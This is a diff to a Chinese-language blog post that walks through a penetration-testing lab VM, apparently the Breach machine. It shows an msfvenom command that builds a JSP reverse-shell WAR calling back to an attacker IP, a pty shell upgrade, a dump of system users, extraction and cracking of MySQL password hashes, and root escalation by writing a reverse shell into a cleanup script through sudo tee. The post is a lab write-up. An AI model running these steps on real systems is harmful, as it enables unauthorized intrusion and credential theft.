@@ -29,8 +29,14 @@
 <meta property="og:image" content="https://i.loli.net/2021/05/11/GXZI1fwaWP4piFN.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/11/jTKaLHUbJDmrRh3.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/LDtSI2FRCoq4XEH.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/QHYwarZ3W9FDOJm.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/rCIt6ZE58MqimnY.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/bZHUfsgpeAzFi47.png">
 <meta property="article:published_time" content="2021-05-10T14:20:36.000Z">
-<meta property="article:modified_time" content="2021-05-12T13:52:39.520Z">
+<meta property="article:modified_time" content="2021-05-13T13:33:16.228Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -319,6 +325,58 @@
 
 <p>访问 <a target="_blank" rel="noopener" href="https://192.168.110.140:8443/_M@nag3Me/html%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%99%BB%E5%BD%95%E4%B8%8D%E6%88%90%E5%8A%9F%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95">https://192.168.110.140:8443/_M@nag3Me/html，如果登录不成功可以尝试</a> BP 发包（因为最新版浏览器如果没有相应证书会有限制，但是 BP 中有各种证书，挂个 BP 代理就上了）</p>
 <p><img src="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png"></p>
+<p>可以上传包含 jsp 马的 war 包，利用 msf 直接生成：<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.100 LPORT=2333 -f war &gt; shell.war</code>，在 msf 上设置一个监听，然后直接传马访问：</p>
+<p><img src="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png"></p>
+<p><img src="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg" alt="~_G_QMR9_8RRP1MXL_V@N_3.jpg"></p>
+<p>此时拿到了 shell 了，可以用 python 来获取交互式 shell：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </code></p>
+<p><img src="https://i.loli.net/2021/05/13/LDtSI2FRCoq4XEH.png"></p>
+<p>查看一下系统用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:</span><br><span class="line">syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:102:106::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:103:109::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false</span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:&#x2F;home&#x2F;milton:&#x2F;bin&#x2F;bash</span><br><span class="line">tomcat6:x:104:112::&#x2F;usr&#x2F;share&#x2F;tomcat6:&#x2F;bin&#x2F;false</span><br><span class="line">colord:x:105:114:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:106:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">blumbergh:x:1001:1001:Bill Lumbergh,,,:&#x2F;home&#x2F;blumbergh:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>有两个用户很有意思：milton &amp; blumbergh（它俩都有 /bin/bash）。可以在 /var/www/5446 中发现两个有趣的 php 文件：</p>
+<p><img src="https://i.loli.net/2021/05/13/QHYwarZ3W9FDOJm.png"></p>
+<p>我们查看一下，里面有数据库用户 root 的信息：</p>
+<p><img src="https://i.loli.net/2021/05/13/rCIt6ZE58MqimnY.png"></p>
+<p>密码为空，我们直接用 mysql -uroot -p 就可以登入：</p>
+<p><img src="https://i.loli.net/2021/05/13/bZHUfsgpeAzFi47.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">select user,password from user;</span><br></pre></td></tr></table></figure>
+
+<p>得到用户密码表：</p>
+<pre><code>+------------------+-------------------------------------------+
+| user             | password                                  |
++------------------+-------------------------------------------+
+| root             |                                           |
+| milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          |
+| root             |                                           |
+| root             |                                           |
+| debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 |
++------------------+-------------------------------------------+
+
+得到 milton 的密码 hash 为 6450d89bd3aff1d893b85d3ad65d2ec2，经解密得到：`thelaststraw`，彳亍… `su milton`，再输入密码，这样就提权到 milton 了。在历史命令中发现有 su 到 blumbergh 用户，寻找 blumbergh 用户密码。
+
+在 http://192.168.110.140/images/bill.png 的 exif 中存在某神秘字符串 `coffeestains`，尝试作为 blumbergh 用户密码登录。成功登录，查看一下权限：
+
+![](https://i.loli.net/2021/05/13/iEvmcHzBZ6uaL1I.png)
+
+![](https://i.loli.net/2021/05/13/4Bw1tUfXdkmvNQ6.png)
+
+可以发现 `/usr/share/cleanup/tidyup.sh` 没有写入权限，但是可以用 root 权限执行 tee 命令把反弹 shell 命令写入然后执行。（tee命令用于读取标准输入的数据，并将其内容输出成文件）
+
+看一下 tidyup.sh 里面是啥吧：
+
+```bash
+cd /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf
+
+每隔三分钟就会清理 webapps 目录下的所有文件，所以之前传的🐎如果不反弹 shell 的话很快就会被删掉。
+
+接下来就是写入命令弹 shell 了：（同时另外开一个 terminal 来接受 shell）
+
+![](https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png)
+
+![](https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png)
+
+可以发现我们已经提权至了 root，后面 flag 什么的便不重要了。
+</code></pre>
 
   </div>
 </article>
